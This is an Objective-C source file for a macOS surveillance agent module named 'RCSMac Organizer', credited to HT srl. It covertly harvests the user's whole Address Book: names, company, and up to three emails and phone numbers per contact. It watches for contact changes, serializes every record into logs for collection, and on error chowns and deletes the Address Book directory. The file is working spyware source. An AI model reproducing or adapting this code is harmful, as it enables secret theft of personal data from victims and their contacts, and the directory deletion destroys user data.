/*
 * RCSMac - Organizer agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/11/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import "RCSMAgentOrganizer.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


static RCSMAgentOrganizer *sharedAgentOrganizer = nil;

@interface RCSMAgentOrganizer (private)

//
// Grab all contacts available on AB
//
- (BOOL)_grabAllContacts;

//
// Callback for ABDatabaseChangedNotification
//
- (void)_ABChangedCallback: (NSNotification *)aNotification;

//
// Serialize the object for logging
//
- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord;

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType;

//
// Write down the log data
// Can be a single contact or a list
//
- (BOOL)_logData: (NSMutableData *)aLogData;

@end

@implementation RCSMAgentOrganizer (private)

- (BOOL)_grabAllContacts
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_ORGANIZER
  verboseLog(@"");
#endif
  
  NSArray *allPeople;

  @try
    {
      allPeople = [[ABAddressBook sharedAddressBook] people];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_ORGANIZER
      errorLog(@"Exception on sharedAddressBook: %@", [e reason]);
#endif

      NSString *abPath = [NSString stringWithFormat:
        @"%@/Library/Application Support/AddressBook",
        NSHomeDirectory()];

      NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
      NSArray *arguments = [NSArray arrayWithObjects:
        @"-R",
        userAndGroup,
        abPath,
        nil];

      [gUtil executeTask: @"/usr/sbin/chown"
           withArguments: arguments
            waitUntilEnd: YES];

      // Remove it so that hopefully somebody will create it in the proper way
      [[NSFileManager defaultManager] removeItemAtPath: abPath
                                                 error: nil];

      return NO;
    }

  NSMutableData *logData = [NSMutableData new];
  
#ifdef DEBUG_ORGANIZER
  infoLog(@"Found %d entries", [allPeople count]);
#endif
  
  for (ABRecord *record in allPeople)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      NSMutableData *logHeader      = [[NSMutableData alloc]
                                       initWithLength: sizeof(organizerAdditionalHeader)];
      organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
      
      NSData *contactLog = [self _prepareContactForLogging: record];
      [contactLog retain];
      
      u_int blockSize = sizeof(organizerAdditionalHeader)
                        + [contactLog length];
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
      
      [logData appendData: logHeader];
      [logData appendData: contactLog];
      
      [contactLog release];
      [innerPool release];
    }
  
  [self _logData: logData];
  [logData release];
  [outerPool release];

  return YES;
}

- (void)_ABChangedCallback: (NSNotification *)aNotification
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_ORGANIZER
  verboseLog(@"userInfo dict: %@", [aNotification userInfo]);
#endif
  
  int i = 0;
  
  // Check first for inserted records
  NSArray *entries = [[aNotification userInfo] objectForKey: kABInsertedRecords];
  
  if (entries == nil)
    {
#ifdef DEBUG_ORGANIZER
      warnLog(@"No new record");
#endif
      
      // Check for updated records
      entries = [[aNotification userInfo] objectForKey: kABUpdatedRecords];
    }
  if (entries == nil)
    {
#ifdef DEBUG_ORGANIZER
      warnLog(@"No updated record, returning");
#endif
      // We return from here since we're not interested in records deletion
      [outerPool release];
      return;
    }

  for (i = 0; i < [entries count]; i++)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      NSString *uniqueID = [entries objectAtIndex: i];
      
#ifdef DEBUG_ORGANIZER
      verboseLog(@"uniqueID: %@", uniqueID);
#endif
      
      ABRecord *record = [[ABAddressBook addressBook] recordForUniqueId: uniqueID];
      
#ifdef DEBUG_ORGANIZER
      infoLog(@"record: %@", record);
#endif
      
      NSMutableData *logData        = [NSMutableData new];
      NSMutableData *logHeader      = [[NSMutableData alloc]
                                       initWithLength: sizeof(organizerAdditionalHeader)];
      organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
      
      NSData *contactLog = [self _prepareContactForLogging: record];
      [contactLog retain];
      
      u_int blockSize = sizeof(organizerAdditionalHeader)
                        + [contactLog length];
      
      additionalHeader->size        = blockSize;
      additionalHeader->version     = CONTACT_LOG_VERSION;
      additionalHeader->identifier  = 0;
      
      [logData appendData: logHeader];
      [logData appendData: contactLog];
      
      [self _logData: logData];
      
      [contactLog release];
      [logHeader release];
      [logData release];
      
      [innerPool release];
    }
  
  [outerPool release];
}

- (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
{
#ifdef DEBUG_ORGANIZER
  verboseLog(@"");
#endif
  
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  NSMutableData *contactLog     = [NSMutableData new];
  
  // First Name
  if ([aRecord valueForProperty: kABFirstNameProperty])
    {
      NSString *element   = [aRecord valueForProperty: kABFirstNameProperty];
      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
#ifdef DEBUG_ORGANIZER
      infoLog(@"FirstName: %@", element);
#endif

      NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                       withType: FirstName];
      [serializedData retain];
      [contactLog appendData: serializedData];
      [serializedData release];
    }
  
  // Last Name
  if ([aRecord valueForProperty: kABLastNameProperty])
    {
      NSString *element   = [aRecord valueForProperty: kABLastNameProperty];
      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

#ifdef DEBUG_ORGANIZER
      infoLog(@"LastName: %@", element);
#endif
      
      NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                       withType: LastName];
      [serializedData retain];
      [contactLog appendData: serializedData];
      [serializedData release];
    }
  
  // Company Name
  if ([aRecord valueForProperty: kABOrganizationProperty])
    {
      NSString *element   = [aRecord valueForProperty: kABOrganizationProperty];
      NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      
#ifdef DEBUG_ORGANIZER
      infoLog(@"CompanyName: %@", element);
#endif

      NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                       withType: CompanyName];
      [serializedData retain];
      [contactLog appendData: serializedData];
      [serializedData release];
    }
  
  // Email Address
  // MultiValue
  if ([aRecord valueForProperty: kABEmailProperty])
    {
      ABMultiValue *email = [aRecord valueForProperty: kABEmailProperty];
      int i = 0;
      
      for (i = 0; i < [email count]; i++)
        {
          //
          // Grab at max 3 email addresses
          //
          if (i == 3)
            {
#ifdef DEBUG_ORGANIZER
              warnLog(@"Won't log anymore emails");
#endif
              break;
            }
          
          NSString *element       = [email valueAtIndex: i];
          NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          uint32_t type           = 0;

#ifdef DEBUG_ORGANIZER
          infoLog(@"EmailAddress: %@", element);
#endif
          
          switch (i)
            {
            case 0:
              type = Email1Address;
              break;
            case 1:
              type = Email2Address;
              break;
            case 2:
              type = Email3Address;
              break;
            }
           
          NSData *serializedData  = [self _serializeSingleRecordData: recordData
                                                            withType: type];
          [serializedData retain];
          [contactLog appendData: serializedData];
          [serializedData release];
        }
    }
  
  // Phone
  // MultiValue
  if ([aRecord valueForProperty: kABPhoneProperty])
    {
      ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
      int i = 0;
      
#ifdef DEBUG_ORGANIZER
      infoLog(@"phone entries: %d", [phone count]);
#endif
      for (i = 0; i < [phone count]; i++)
        {
          //
          // Grab at max 3 email addresses
          //
          if (i == 3)
            {
#ifdef DEBUG_ORGANIZER
              warnLog(@"Won't log anymore phone numbers");
#endif
              break;
            }
          
          NSString *element       = [phone valueAtIndex: i];
          NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
          uint32_t type           = 0;

#ifdef DEBUG_ORGANIZER
          infoLog(@"Phone: %@", element);
#endif
          
          if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
            {
#ifdef DEBUG_ORGANIZER
              infoLog(@"is Mobile");
#endif
              type = MobileTelephoneNumber;
            }
          else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
            {
#ifdef DEBUG_ORGANIZER
              infoLog(@"is Business");
#endif
              type = BusinessTelephoneNumber;
            }
          else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
            {
#ifdef DEBUG_ORGANIZER
              infoLog(@"is Home");
#endif
              type = HomeTelephoneNumber;
            }
          else
            {
#ifdef DEBUG_ORGANIZER
              infoLog(@"Forcing to HomePhone for (%@)", [phone labelAtIndex: i]);
#endif
              // Forcing home telephone number just in case
              type = HomeTelephoneNumber;
            }
          
          NSData *serializedData  = [self _serializeSingleRecordData: recordData
                                                            withType: type];
          [serializedData retain];
          [contactLog appendData: serializedData];
          [serializedData release];
        }
    }
  
  [outerPool release];
  
  return [contactLog autorelease];
}

- (NSData *)_serializeSingleRecordData: (NSData *)aRecordData
                              withType: (int32_t)aType
{
  u_int elemSize = [aRecordData length];
  NSMutableData *singleElement = [NSMutableData new];
  
  //
  // This should be tag-1b -- len-3b (1dword)
  //
  u_int tag = aType << 24;
  tag |= (elemSize & 0x00FFFFFF);
  
  [singleElement appendBytes: &tag
                      length: sizeof(u_int)];
  [singleElement appendData: aRecordData];
  
  return [singleElement autorelease];
}

- (BOOL)_logData: (NSMutableData *)aLogData
{
#ifdef DEBUG_ORGANIZER
  verboseLog(@"");
#endif
  
  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
  
  if ([logManager createLog: AGENT_ORGANIZER
                agentHeader: nil
                  withLogID: 0] == FALSE)
    {
#ifdef DEBUG_ORGANIZER
      errorLog(@"An error occurred while creating log");
#endif
      
      return FALSE;
    }
  
  if ([logManager writeDataToLog: aLogData
                        forAgent: AGENT_ORGANIZER
                       withLogID: 0] == FALSE)
      {
#ifdef DEBUG_ORGANIZER
        errorLog(@"An error occurred while writing data");
#endif
        
        return FALSE;
      }

  [logManager closeActiveLog: AGENT_ORGANIZER
                   withLogID: 0];
  
  return YES;
}

@end


@implementation RCSMAgentOrganizer

//@synthesize mConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMAgentOrganizer *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentOrganizer;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentOrganizer == nil)
      {
        sharedAgentOrganizer = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentOrganizer;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_ORGANIZER
  infoLog(@"Agent organizer started");
  infoLog(@"AgentConf: %@", mConfiguration);
#endif
  
  [mConfiguration setObject: AGENT_RUNNING
                     forKey: @"status"];
  
  //
  // Register our observer in order to grab notifications about changes
  // NOTE: kABDatabaseChangedExternallyNotification on NSNotificationCenter
  // doesn't seem to work
  //
  // On Distributed Notification Center
  // - @"ABDatabaseChangedNotification"
  // - @"ABDatabaseChangedNotificationPriv" (sent always two times)
  //
  [[NSDistributedNotificationCenter defaultCenter] addObserver: self
                                                      selector: @selector(_ABChangedCallback:)
                                                          name: @"ABDatabaseChangedNotification"
                                                        object: nil];
  
  //
  // First off, grab all contacts
  //
  if ([self _grabAllContacts] == NO)
    {
#ifdef DEBUG_ORGANIZER
      errorLog(@"Error on grabAllContacts, DB not created yet, quitting.");
#endif

      [mConfiguration setObject: AGENT_STOP
                         forKey: @"status"];
    }

  while ([mConfiguration objectForKey: @"status"]    != AGENT_STOP
         && [mConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      //[[NSRunLoop currentRunLoop] runUntilDate: sleepInterval];
      sleep(1);
    }

#ifdef DEBUG_ORGANIZER
  warnLog(@"STOPPING");
#endif

  //
  // Remove our observer
  //
  [[NSDistributedNotificationCenter defaultCenter] removeObserver: self];
  
  if ([mConfiguration objectForKey: @"status"] == AGENT_STOP)
    {
      [mConfiguration setObject: AGENT_STOPPED
                         forKey: @"status"];
    }
  
  [outerPool release]; 
}

- (BOOL)stop
{
#ifdef DEBUG_ORGANIZER
  verboseLog(@"");
#endif

  int internalCounter = 0;
  [mConfiguration setObject: AGENT_STOP
                     forKey: @"status"];
  
#ifdef DEBUG_ORGANIZER
  warnLog(@"Configuration set to STOP, now waiting");
#endif
  
  while ([mConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      usleep(100000);
    }
  
#ifdef DEBUG_ORGANIZER
  warnLog(@"STOPPED");
#endif

  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mConfiguration)
    {
      [mConfiguration release];
      mConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mConfiguration
{
  return mConfiguration;
}

@end
